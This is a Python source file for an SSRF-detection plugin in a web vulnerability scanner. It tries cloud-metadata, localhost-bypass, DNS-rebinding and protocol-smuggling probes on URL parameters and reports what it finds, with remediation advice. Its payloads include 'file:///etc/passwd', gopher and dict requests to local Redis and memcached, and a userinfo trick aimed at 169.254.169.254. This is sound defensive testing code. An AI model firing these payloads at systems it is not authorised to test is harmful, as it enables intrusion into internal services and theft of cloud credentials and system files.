from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from app.plugins.base import BasePlugin, Confidence, PluginResult, Severity
from app.plugins.ssrf.callbacks import MetadataProbeSet, SsrfScorer


class SsrfPlugin(BasePlugin):
    name = "ssrf"
    description = "Detects URL-parameter SSRF signals and cloud metadata leakage markers"
    category = "server-side-request-forgery"
    active = True

    url_param_names = ("url", "uri", "next", "target", "dest", "destination", "redirect", "callback", "webhook", "feed", "image", "path")

    async def run(self, target_url, client):
        parsed = urlsplit(target_url)
        params = parse_qsl(parsed.query, keep_blank_values=True)[:5]
        candidates = [(index, name, value) for index, (name, value) in enumerate(params) if self._looks_url_like(name, value)]
        if not candidates:
            return []

        findings = []
        baseline = await client.get(target_url)
        baseline_lower = baseline.text.lower()

        # Let's limit candidate parameters to 2 to stay within request budget
        for index, name, value in candidates[:2]:
            # 1. Metadata probes (AWS, Azure, GCP)
            for probe_key, probe_url_payload in MetadataProbeSet.PROBES.items():
                provider = MetadataProbeSet.get_probe_provider(probe_key)
                
                # Mutate parameter
                mutated = list(params)
                mutated[index] = (name, probe_url_payload)
                probe_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(mutated), ""))
                
                try:
                    response = await client.get(probe_url)
                except Exception:
                    continue

                # Collect markers
                provider_markers = MetadataProbeSet.MARKERS.get(provider, ())
                matched_markers = [marker for marker in provider_markers if marker.lower() in response.text.lower() and marker.lower() not in baseline_lower]
                
                severity, confidence, score = SsrfScorer.calculate_score(
                    status_code=response.status_code,
                    response_text=response.text,
                    baseline_text=baseline.text,
                    matched_markers=matched_markers
                )

                if score >= 50:
                    findings.append(self._finding(
                        target_url=target_url,
                        probe_url=probe_url,
                        parameter=name,
                        original_value=value,
                        test_type=f"metadata_{provider}",
                        status_code=response.status_code,
                        markers=matched_markers if matched_markers else ["response changed after metadata probe"],
                        severity=severity,
                        confidence=confidence,
                        score=score
                    ))
                    break  # Found SSRF on this parameter, move to next parameter or probe types

            # 2. Protocol smuggling probes (file, gopher, dict)
            protocol_payloads = {
                "file": "file:///etc/passwd",
                "gopher": "gopher://127.0.0.1:6379/_PING",
                "dict": "dict://127.0.0.1:11211/stats"
            }
            protocol_markers = {
                "file": ["root:x:0:0", "[boot loader]", "bin/bash", "etc/passwd"],
                "gopher": ["+PONG", "ERR unknown command", "redis"],
                "dict": ["STAT pid", "STAT uptime", "memcached"]
            }

            for proto, payload in protocol_payloads.items():
                mutated = list(params)
                mutated[index] = (name, payload)
                probe_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(mutated), ""))

                try:
                    response = await client.get(probe_url)
                except Exception:
                    continue

                matched = [m for m in protocol_markers[proto] if m.lower() in response.text.lower() and m.lower() not in baseline_lower]
                if matched:
                    severity, confidence, score = SsrfScorer.calculate_score(
                        status_code=response.status_code,
                        response_text=response.text,
                        baseline_text=baseline.text,
                        matched_markers=[],
                        protocol_smuggling=True
                    )
                    findings.append(self._finding(
                        target_url=target_url,
                        probe_url=probe_url,
                        parameter=name,
                        original_value=value,
                        test_type=f"protocol_{proto}",
                        status_code=response.status_code,
                        markers=matched,
                        severity=severity,
                        confidence=confidence,
                        score=score,
                        description=f"A URL-like parameter permitted protocol smuggling via {proto} scheme."
                    ))
                    break

            # 3. Redirect-chain SSRF probes
            # Mutate to a localhost/internal URL redirect pattern or userinfo bypass
            redirect_payloads = [
                "http://localhost@169.254.169.254/latest/meta-data/",
                "http://127.0.0.1.nip.io/latest/meta-data/"
            ]
            for payload in redirect_payloads:
                mutated = list(params)
                mutated[index] = (name, payload)
                probe_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(mutated), ""))

                try:
                    response = await client.get(probe_url)
                except Exception:
                    continue

                # Check if it loaded metadata
                aws_markers = MetadataProbeSet.MARKERS["aws"]
                matched_aws = [m for m in aws_markers if m.lower() in response.text.lower() and m.lower() not in baseline_lower]
                if matched_aws:
                    severity, confidence, score = SsrfScorer.calculate_score(
                        status_code=response.status_code,
                        response_text=response.text,
                        baseline_text=baseline.text,
                        matched_markers=matched_aws,
                        has_redirect=True
                    )
                    findings.append(self._finding(
                        target_url=target_url,
                        probe_url=probe_url,
                        parameter=name,
                        original_value=value,
                        test_type="redirect_chain",
                        status_code=response.status_code,
                        markers=matched_aws,
                        severity=severity,
                        confidence=confidence,
                        score=score,
                        description="A URL-like parameter followed redirect/bypass chains to reach internal metadata endpoint."
                    ))
                    break

            # 4. DNS Rebinding / TOCTOU markers detection
            mutated = list(params)
            mutated[index] = (name, "http://127.0.0.1/")
            probe_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(mutated), ""))
            
            try:
                r1 = await client.get(probe_url)
                r2 = await client.get(probe_url)
                if r1.status_code != r2.status_code or abs(len(r1.text) - len(r2.text)) > 1000:
                    if r1.status_code < 500 and r2.status_code < 500:
                        findings.append(self._finding(
                            target_url=target_url,
                            probe_url=probe_url,
                            parameter=name,
                            original_value=value,
                            test_type="dns_rebinding_indicator",
                            status_code=r1.status_code,
                            markers=["Consecutive request text deviation"],
                            severity=Severity.medium,
                            confidence=Confidence.low,
                            score=50,
                            description="Response deviation between consecutive requests indicates potential TOCTOU/DNS rebinding susceptibility."
                        ))
            except Exception:
                pass

        return findings

    def _looks_url_like(self, name: str, value: str) -> bool:
        lowered = name.lower()
        parsed = urlsplit(value)
        return lowered in self.url_param_names or lowered.endswith("_url") or parsed.scheme in {"http", "https"}

    def _finding(self, target_url, probe_url, parameter, original_value, test_type, status_code, markers, severity, confidence, score, description=None):
        desc = description or "A URL-like parameter produced cloud metadata or internal-fetch behavior when supplied a metadata endpoint. The scanner only changed the public target query string; it did not connect to private infrastructure directly."
        return PluginResult(
            self.name,
            f"Possible SSRF via {parameter}",
            desc,
            severity,
            confidence,
            self.category,
            target_url,
            f"{test_type.upper()} SSRF probe changed response; evidence marker: {', '.join(markers) if markers else 'none'}.",
            "Deny internal, link-local, loopback, and cloud metadata destinations in server-side fetchers. Use an allowlist of outbound domains, resolve and re-check IPs after redirects, and block protocol smuggling.",
            "CWE-918",
            {
                "parameter": parameter,
                "original_value": original_value,
                "provider": test_type.split("_")[-1] if "_" in test_type else test_type,
                "test_type": test_type,
                "probe_url": probe_url,
                "status_code": status_code,
                "markers": markers,
                "validation_score": score,
                "replay_data": {
                    "method": "GET",
                    "url": probe_url,
                    "expected_safe_result": "request rejected before server-side fetch",
                },
            },
        )
